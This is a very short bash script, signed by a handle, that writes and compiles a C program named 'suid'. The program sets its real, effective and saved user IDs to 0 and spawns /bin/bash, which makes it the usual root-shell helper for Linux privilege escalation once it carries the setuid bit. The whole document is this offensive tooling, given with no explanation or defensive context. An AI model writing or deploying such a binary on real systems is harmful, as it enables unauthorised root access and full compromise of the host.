#!/bin/bash
# @404death

cat <<EOF > suid.c
int main(void){
  setresuid(0, 0, 0);
  system("/bin/bash");
}
EOF
gcc suid.c -o suid
